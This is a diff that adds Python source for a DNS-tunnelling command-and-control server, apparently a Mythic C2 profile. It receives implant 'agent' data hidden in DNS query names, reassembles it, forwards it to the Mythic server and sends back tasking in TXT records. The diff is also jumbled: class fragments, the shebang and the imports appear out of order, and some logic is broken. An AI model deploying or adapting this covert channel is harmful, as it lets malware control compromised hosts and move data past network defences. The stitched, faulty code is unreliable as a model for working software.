@@ -266,6 +266,617 @@ class Resolver:
                 break
             index = index + 1
 
+        if found == True:
+            msgtype = self.get_msgtype(qname, inst)
+
+        if found == True:
+            if msgtype == 0:
+                found = False
+            else:
+                found = True
+
+        fields = self.get_fields(qname, msgtype, domain_found)
+
+        if found == False or fields == None or self.hmac_check(fields, msgtype, self.instances[inst]['key']) == False:
+
+            # hmac will be checked even for init msgs
+            # this avoids someone querying the server to open multiple channels
+            reply = request.reply()
+            reply.add_answer(*RR.fromZone('0.0.0.0 60 IN TXT "txtvers=1"'))
+
+
+
+        else:
+            tsid = fields['tsid']
+            channel_offer = int(tsid[:2], 16)
+            bit_flip = int(tsid[2], 16)
+            seq = int(tsid[3:], 16)
+
+            if msgtype == msginit:
+                # agent is starting communications
+                channel = ""
+                try:
+                    channel = self.check_channel(channel_offer, bit_flip, domain_found,fields['data'])  # channel value is the reference for the agent object
+
+                    seq = self.increment_seq(seq)
+                except Exception as e:
+                    pass
+                try:    
+                    self.config['worker'].agents[channel].init_seq = seq  # initial seq will be a random value set by the agent (0-200)
+                    msg_reply = ""
+                
+                    new_tsid = "{:02x}".format(channel) + "{:06x}".format(seq)
+                    msg_reply = self.create_reply(channel, new_tsid, domain_found, bit_flip, seq, fields['data'],msgtype)
+                    self.config['worker'].agents[channel].bit_flip = agent_turn
+                except Exception as e:
+                    pass
+                reply = request.reply()
+                reply.add_answer(RR(qname, qtype, rdata=TXT(msg_reply)))
+
+
+            else:
+                if channel_offer not in self.config['worker'].agents:
+                    reply = request.reply()
+                    reply.add_answer(*RR.fromZone(''))
+                    return reply
+
+                if bit_flip == reset_turn:
+                    if self.config['worker'].agents[channel_offer].is_sending() != False:
+                        self.config['worker'].agents[channel_offer].renew_server_msg_queue()
+                    seq = self.config['worker'].agents[channel_offer].init_seq
+                    packet = ""
+                    new_tsid = "{:02x}".format(channel_offer) + "{:06x}".format(seq)
+                    msg_reply = new_tsid + "." + str(self.config['worker'].agents[channel_offer].bit_flip) + "." + str(
+                        packet)
+                    reply = request.reply()
+                    reply.add_answer(RR(qname, qtype, rdata=TXT(msg_reply)))
+
+                else:
+                    # server is sending packets
+
+                    # server should check if there are packets to be sent
+                    # if there are packets, server is sending commands
+                    # if no packets, agent is sending data
+                    if self.config['worker'].agents[channel_offer].is_sending():
+                        # check if bit_flip has inverted
+                        # if not inverted, the agent did not receive the ack of the receiving of the last packet
+                        if bit_flip == message_turn or bit_flip == agent_turn: #agent turn in case last packet did not receive confirmation in agent side
+                            packet = format(self.config['worker'].agents[channel_offer].message_count,
+                                            'x')  # agent will receive the amount of messages the server will send again
+                            seq = self.config['worker'].agents[channel_offer].init_seq
+                            bit_flip = str(message_turn)
+                        else:
+                            # check if the requested id of the packet is above the messages id:
+                            # this means the agent received all the messages and is confirming the server that it will start replying
+                            try:
+                                packet = self.config['worker'].agents[channel_offer].get_packet(seq)
+                                
+                            except Exception as e:
+                                
+                                packet = binascii.b2a_hex(os.urandom(10))
+                                self.config['worker'].agents[channel_offer].bit_flip = reset_turn
+                            # if server received ack of the last packet
+                            # packet will have no content and bit will be flipped
+                                bit_flip = str(self.config['worker'].agents[channel_offer].bit_flip)
+                        
+                        new_tsid = "{:02x}".format(channel_offer) + "{:06x}".format(seq)
+                        msg_reply = new_tsid + "." + str(bit_flip) + "." + str(packet)
+                        reply = request.reply()
+                        reply.add_answer(RR(qname, qtype, rdata=TXT(msg_reply)))
+                    else:
+                        # data from agent
+                        try:
+                            if bit_flip == self.config['worker'].agents[channel_offer].bit_flip and fields['data'] != \
+                                    self.config['worker'].agents[channel_offer].cache_code:
+                                seq = self.config['worker'].agents[channel_offer].add_packet(fields['data'], seq)
+                            new_tsid = "{:02x}".format(channel_offer) + "{:06x}".format(seq)
+                            msg_reply = self.create_reply(channel_offer, new_tsid, domain_found, bit_flip, seq,
+                                                          fields['data'], msgtype)
+                            reply = request.reply()
+                            reply.add_answer(RR(qname, qtype, rdata=TXT(msg_reply)))
+                        except Exception as e:
+                            print(str(e))
+
+        return reply
+
+    def create_reply(self, channel, new_tsid, domain, comparator, seq, data, msgtype):
+        cached_msg = False
+        if data == self.config['worker'].agents[channel].cache_code and msgtype != msginit:
+            cached_msg = True
+        if comparator == self.config['worker'].agents[channel].bit_flip and cached_msg == False:
+            # agent is just sending the packets from the same message
+            return str(new_tsid) + "." + str(self.config['worker'].agents[channel].bit_flip) + "." + str(domain)
+        else:
+            # agent finished sending packets and received the ack from the last packet
+            # agent changed the bit_flip signaling that packets are over
+            if cached_msg == False:
+                full_msg = self.rebuild_pack(channel, seq)
+                self.config['worker'].agents[channel].cached_message_client = full_msg
+            else:
+                self.use_caching(channel, seq)
+                full_msg = self.config['worker'].agents[channel].cached_message_client
+            mythic_msg = agent_message(full_msg)
+            resp_msg = mythic_msg['result']
+            dec_msg = mythic_msg['message']
+            if dec_msg == self.config['worker'].agents[channel].cached_message_server and False:
+                resp_msg = self.config['worker'].agents[channel].cache_code
+                self.setup_resp_queue_cache(resp_msg, channel)
+            else:
+                self.config['worker'].agents[channel].cached_message_server = dec_msg
+                self.setup_resp_queue(resp_msg, channel)
+            new_tsid = "{:02x}".format(channel) + "{:06x}".format(self.config['worker'].agents[channel].init_seq)
+            return str(new_tsid) + "." + str(self.config['worker'].agents[channel].bit_flip) + "." + format(
+                self.config['worker'].agents[channel].message_count, 'x')
+
+    def setup_resp_queue_cache(self, resp_msg, channel):
+        messages = [resp_msg]
+        self.config['worker'].agents[channel].message_count = len(messages)
+
+        self.config['worker'].agents[channel].server_msg_queue = messages
+        # this func will parse the full message into blocks using the full size of the DNS query
+
+    def setup_resp_queue(self, resp_msg, channel):
+        packet_size = self.config['worker'].agents[channel].get_packet_size()
+        resp_msg = resp_msg.hex()
+        messages = textwrap.wrap(resp_msg, packet_size)
+        self.config['worker'].agents[channel].message_count = len(messages)
+        self.config['worker'].agents[channel].server_msg_queue = messages
+        # this func will parse the full message into blocks using the full size of the DNS query
+
+    def get_msgtype(self, qname, inst):
+        prefix = qname.split('.')[0]
+
+        if self.instances[inst]['msginit'] == prefix:
+            # no message type found
+            msgtype = msginit
+        else:
+            if self.instances[inst]['msgdefault'] == prefix:
+                msgtype = msgdefault
+            else:
+                msgtype = 0
+
+        return msgtype
+
+    def get_fields(self, qname, msgtype, domain):
+        try:
+            fields = {}
+            sections_prev = qname.split(domain)
+            sections = sections_prev[0].split(".")
+
+            fields['prefix'] = sections[0]
+            fields['tsid'] = sections[1]
+            fields['data'] = sections[2]
+            fields['hmac'] = sections[3]
+            return fields
+        except:
+            return {}
+
+    def increment_seq(self, seq):
+        seq = seq + 1
+        if seq == 10000000:
+            seq = 1
+        return seq
+
+    def hmac_check(self, fields, msgtype, key):
+
+        hmac_ch = hmac.new(key.encode(), (fields['tsid'] + fields['data']).encode('utf-8'), hashlib.md5).hexdigest()
+        if hmac_ch == fields['hmac']:
+            return True
+        else:
+            return False
+
+    """def queu_req(self, qname, key,domain):
+        sections = qname.split(domain)
+        sections_new = sections[0].split(".")
+        #should have 3 sections:
+
+        #count.BYTES.DOMAIN
+
+        #if query does not have starting point
+        #negotiate starting point
+
+        # else
+        # enqueue
+
+        if len(sections_new) == 2:
+            #negotiation to start
+            import random
+            self.config[key]['stp'] = random.randint(1, 100000)
+            return True
+        else:
+            if len(sections_new) == 3:
+                #
+                count = sections[0]
+                bytes = sections[1]
+                self.config[key]['queue'][count] = bytes
+            else:
+                if len(sections_new) == 1:
+                    pass
+
+"""
+
+    def check_channel(self, channel_offer, bit_flip, qname, data):
+        self.config['worker'].mutex_msginit.acquire()
+        if bit_flip == init_seq:
+            # new connection
+            if channel_offer in self.config['worker'].agents:
+                # channel collision
+                # select another channel
+                # create the agent object
+                alternate_channel = self.get_next_channel(channel_offer)
+                self.config['worker'].agents[alternate_channel] = Agent_Con(bit_flip, alternate_channel, data)
+                self.config['worker'].mutex_msginit.release()
+                return alternate_channel
+            else:
+                self.config['worker'].agents[channel_offer] = Agent_Con(bit_flip, channel_offer, data)
+                self.config['worker'].mutex_msginit.release()
+                return channel_offer
+        else:
+            if bit_flip == agent_turn or bit_flip == server_turn:
+                # agent is already connected and starting another message
+                # object already exists
+                self.config['worker'].mutex_msginit.release()
+                return channel_offer
+
+    def get_next_channel(self, channel_offer):
+        while channel_offer in self.config['worker'].agents:
+            channel_offer += 1
+            if channel_offer > 200:
+                channel_offer = 0
+        return channel_offer
+
+    def use_caching(self, channel, seq):
+        self.config['worker'].agents[channel].sending = True  # server will start replying
+        seq = self.increment_seq(seq)
+        self.config['worker'].agents[channel].renew_client_msg_queue(seq)  # restart queue
+
+    def rebuild_pack(self, channel, seq):
+        self.config['worker'].agents[channel].sending = True  # server will start replying
+        full_msg = ""
+        it = 0
+        while it in self.config['worker'].agents[channel].client_msg_queue:
+            full_msg = full_msg + self.config['worker'].agents[channel].client_msg_queue[it]
+            it = it + 1
+
+        bytes_object = bytes.fromhex(full_msg)
+        decoded_msg = bytes_object.decode("ASCII")
+        seq = self.increment_seq(seq)
+        self.config['worker'].agents[channel].renew_client_msg_queue(seq)  # restart queue
+        return decoded_msg
+
+    def parse_pack(self):
+        pass
+
+
+def agent_message(msg, **kwargs):
+    global config
+    try:
+
+
+        response = requests.post(config['mythic_address'], data=msg, headers={"Mythic":"dns","content-type": "text/plain"},
+                                 verify=False)
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        decoded_response = base64.b64decode(response.text)
+        uuid_resp = decoded_response[:36]
+        uuid_resp = str(uuid_resp, 'utf-8')
+        #try:
+         #   msg = loop.run_until_complete(
+          #      MythicCallbackRPC().decrypt_bytes(with_uuid=True, data=response.text, uuid=str(uuid_resp)))
+        #finally:
+         #   loop.run_until_complete(loop.shutdown_asyncgens())
+          #  loop.close()
+        # response = requests.post(config['mythic_address'], data=msg, verify=False, cookies=parsed_pack["cookies"],headers=parsed_pack["headers"])
+        return {"result": response.content, "message": None}
+    except Exception as e:
+        return None
+
+
+async def print_flush(message):
+    print(message)
+    sys.stdout.flush()
+
+
+def server_error_handler(request, exception):
+    pass
+
+
+"""
+async def agent_message(request, **kwargs):
+    global config
+    try:
+        if config[request.app.name]['debug']:
+            await print_flush("agent_message request from: {} with {} and {}".format(request.url, request.cookies, request.headers))
+            await print_flush(" and URI: {}".format(request.query_string))
+        if config[request.app.name]['debug']:
+            await print_flush("Forwarding along to: {}".format(config['mythic_address']))
+        if request.method == "POST":
+            # manipulate the request if needed
+            #await MythicCallbackRPC().add_event_message(message="got a POST message")
+            response = requests.post(config['mythic_address'], data=request.body, verify=False, cookies=request.cookies, headers=request.headers)
+        else:
+            # manipulate the request if needed
+            #await MythicCallbackRPC().add_event_message(message="got a GET message")
+            #msg = await MythicCallbackRPC().encrypt_bytes(with_uuid=True, data="my message".encode(), uuid="eaf10700-cb30-402d-b101-8e35d67cdb41")
+            #await MythicCallbackRPC().add_event_message(message=msg.response)
+            response = requests.get(config['mythic_address'] + "?{}".format(request.query_string), verify=False, data=request.body, cookies=request.cookies, headers=request.headers)
+        return raw(response.content, headers=config[request.app.name]['headers'], status=response.status_code)
+    except Exception as e:
+        if request is None:
+            await print_flush("Invalid HTTP Method - Likely HTTPS trying to talk to HTTP")
+            return server_error_handler(request, e)
+        if config[request.app.name]['debug']:
+            await print_flush("error in agent_message: {}".format(str(e)))
+        return server_error_handler(request, e)
+"""
+
+if __name__ == "__main__":
+    sys.path.append("/Mythic/mythic")
+    from mythic_c2_container.C2ProfileBase import *
+    from mythic_c2_container.MythicCallbackRPC import *
+
+    config_file = open("config.json", 'rb')
+    main_config = json.loads(config_file.read().decode('utf-8'))
+    print("Opening config and starting instances...")
+    sys.stdout.flush()
+    # basic mapping of the general endpoints to the real endpoints
+    try:
+        config['mythic_address'] = os.environ['MYTHIC_ADDRESS']
+    except Exception as e:
+        print("failed to find MYTHIC_ADDRESS environment variable")
+        sys.stdout.flush()
+        sys.exit(1)
+    # now look at the specific instances to start
+    try:
+        index = 0
+        instances = {}
+        for inst in main_config['instances']:
+            instances[index] = {'debug': inst['debug'],
+                                'domains': inst['domains'], 'key': inst['key'], 'msginit': inst['msginit'],
+                                'msgdefault': inst['msgdefault']}
+            if inst['debug']:
+                print("Debugging statements are enabled. This gives more context, but might be a performance hit")
+            else:
+                print("Debugging statements are disabled")
+            inst['queue'] = {}
+            inst['stp'] = 0
+            sys.stdout.flush()
+            # now to create an app instance to handle responses
+            index = index + 1
+        resolver = Resolver(instances)
+        server = DNSServer(resolver, port=53, address="0.0.0.0")
+        server.start_thread()
+        while server.isAlive():
+            time.sleep(1)
+            sys.stdout.flush()
+    except Exception as e:
+        print(e)
+     
+    
+
+        self.bit_flip = bit_flip
+        self.channel = channel
+        self.server_msg_queue = {}  # packets from server
+        self.client_msg_queue = {}  # data from client
+        self.sending = False
+        self.init_seq = -1
+        self.turns = 0  # limit seq < 10000000
+        self.turn_old = 0
+        self.next_packet = 1
+        self.message_count = 0
+        self.th = None
+        self.cache_code = cache_code
+        self.cached_message_server = ""
+        self.cached_message_client = ""
+
+    def get_last_msg(self):
+        it = 0
+        while it in self.client_msg_queue:
+            it = it + 1
+        return it
+
+    def start_message_organizer(self):
+        self.th = threading.Thread(target=self.message_organizer())
+        self.th.start()
+
+    def is_sending(self):
+        return self.sending
+
+    def renew_server_msg_queue(self):
+        self.server_msg_queue = {}
+        self.sending = False
+        self.turns = 0
+        self.bit_flip = agent_turn
+        self.init_seq = random.randint(0, 200)
+        # self.th = threading.Thread(target=self.message_organizer())
+        # self.th.start()
+
+    def renew_client_msg_queue(self, seq):
+        self.client_msg_queue = {}
+        self.sending = True  # server will start replying
+        self.turns = 0
+        self.init_seq = random.randint(0, 200)
+        self.bit_flip = server_turn
+        # self.th.join()
+
+    def get_packet_size(self):
+        packet_size = 255 - self.channel - 6  # 6 = seq size
+        return packet_size
+
+#!/usr/bin/env python3
+
+import hmac
+import hashlib
+import sys
+import asyncio
+import ssl
+from pathlib import Path
+import requests
+import json
+import os
+import random
+import textwrap
+import time
+import threading
+import traceback
+import base64
+import uuid
+import binascii
+
+from dnslib import TXT
+from threading import Thread, Lock
+
+config = {}
+from dnslib.server import DNSServer, DNSLogger, DNSRecord
+from dnslib.dns import RR
+
+reset_turn = 4  # bit_flip to reset cycle
+message_turn = 3  # bit_flip used to control message_count req
+server_turn = 2  # server turn to reply
+agent_turn = 1  # agent turn to reply
+init_seq = 0  # message_start
+
+queue = ""
+msginit = 1
+msgdefault = 2
+
+
+class Agent_Worker:
+    def __init__(self):
+        self.agents = {}
+        self.mutex_msginit = Lock()
+
+
+class Agent_Con:
+    def __init__(self, bit_flip, channel, cache_code):
+        self.bit_flip = bit_flip
+        self.channel = channel
+        self.server_msg_queue = {}  # packets from server
+        self.client_msg_queue = {}  # data from client
+        self.sending = False
+        self.init_seq = -1
+        self.turns = 0  # limit seq < 10000000
+        self.turn_old = 0
+        self.next_packet = 1
+        self.message_count = 0
+        self.th = None
+        self.cache_code = cache_code
+        self.cached_message_server = ""
+        self.cached_message_client = ""
+
+    def get_last_msg(self):
+        it = 0
+        while it in self.client_msg_queue:
+            it = it + 1
+        return it
+
+    def start_message_organizer(self):
+        self.th = threading.Thread(target=self.message_organizer())
+        self.th.start()
+
+    def is_sending(self):
+        return self.sending
+
+    def renew_server_msg_queue(self):
+        self.server_msg_queue = {}
+        self.sending = False
+        self.turns = 0
+        self.bit_flip = agent_turn
+        self.init_seq = random.randint(1, 200)
+        # self.th = threading.Thread(target=self.message_organizer())
+        # self.th.start()
+
+    def renew_client_msg_queue(self, seq):
+        self.client_msg_queue = {}
+        self.sending = True  # server will start replying
+        self.turns = 0
+        self.init_seq = random.randint(1, 200)
+        self.bit_flip = server_turn
+        # self.th.join()
+
+    def get_packet_size(self):
+        packet_size = 255 - self.channel - 6  # 6 = seq size
+        return packet_size
+
+    # TODO convert to thread
+    def message_organizer(self):
+        # thread that will organize the packets received
+        # while server is receiving data
+        it = 0
+        while self.is_sending() == False:
+            if bool(self.client_msg_queue):
+                if it in self.client_msg_queue:
+                    it = it + 1
+                    # iterate till the next missing one
+                    self.next_packet = it
+                    # update the next packet to be received
+                else:
+                    time.sleep(0.5)
+            else:
+                time.sleep(1)
+
+    def seq_to_id(self, seq):
+        packet_id = seq - self.init_seq
+        return packet_id
+
+    def id_to_seq(self, id):
+        seq = id + self.init_seq
+        return seq
+
+    def add_packet(self, packet, seq):
+        packet = packet.replace("\n", "").replace(" ", "")
+        packet_id = self.seq_to_id(seq)
+
+        if packet_id not in self.client_msg_queue:
+            self.client_msg_queue[packet_id] = packet
+            return self.id_to_seq(self.get_last_msg())
+        else:
+            return self.id_to_seq(self.get_last_msg())  # repeated packet
+
+    def get_packet(self, seq):
+        packet_id = self.seq_to_id(seq)
+        packet = self.server_msg_queue[packet_id]
+        return packet
+
+
+class Resolver:
+    global queue
+    instance = ""
+
+    def __init__(self, instances):
+        self.instances = instances
+        self.config = {}
+        worker = Agent_Worker()
+        self.config['worker'] = worker
+
+    def resolve(self, request, handler):
+
+        qclass = request.questions[0].qclass
+        qname = str(request.questions[0].qname)
+        qtype = request.questions[0].qtype
+
+
+        # 1) query received
+        # 2) check each instance if has the domain
+
+        msgtype = 0
+        inst = ""
+        domain_found = ""
+        found = False
+
+        index = 0
+        for key in self.instances:
+            domains = self.instances[key]['domains'].split(",")
+            for j in domains:
+                if j in qname:
+                    inst = key
+                    domain_found = j
+                    found = True
+                    break
+            if found == True:
+                break
+            index = index + 1
+
         msgtype = self.get_msgtype(qname, inst)
 
         if found == True:
